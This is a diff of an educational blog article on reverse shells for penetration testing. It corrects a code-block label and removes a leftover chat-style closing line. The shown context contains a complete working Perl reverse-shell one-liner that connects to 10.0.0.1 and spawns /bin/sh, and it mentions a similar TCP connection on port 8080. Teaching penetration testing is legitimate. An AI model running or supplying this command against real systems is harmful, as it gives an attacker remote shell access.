@@ -27,7 +27,7 @@ This command initiates a TCP connection to `10.0.0.1` on port `8080`, redirectin
 
 Perl, another widely available language on many systems, can also be used to execute a reverse shell. The following Perl one-liner creates a TCP socket and connects to the specified IP and port:
 
-```pearl
+```shell
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
@@ -115,7 +115,3 @@ Penetration testing is a critical part of cybersecurity and is intended to ident
 Understanding how to establish a reverse shell is an essential skill for anyone in the field of penetration testing. The methods presented here are applicable to a wide range of systems, from Unix-based platforms to environments with scripting languages like Python, Perl, and Ruby.
 
 Always remember: ethical hacking is about improving security and protecting systems, not exploiting them for personal gain. Use these techniques responsibly and only within the bounds of authorization.
-
-This revision includes a focus on the ethical use of penetration testing tools, emphasizing the importance of authorization and responsibility. It should provide a comprehensive, professional, and educational overview of reverse shells for your learning blog!
-
-
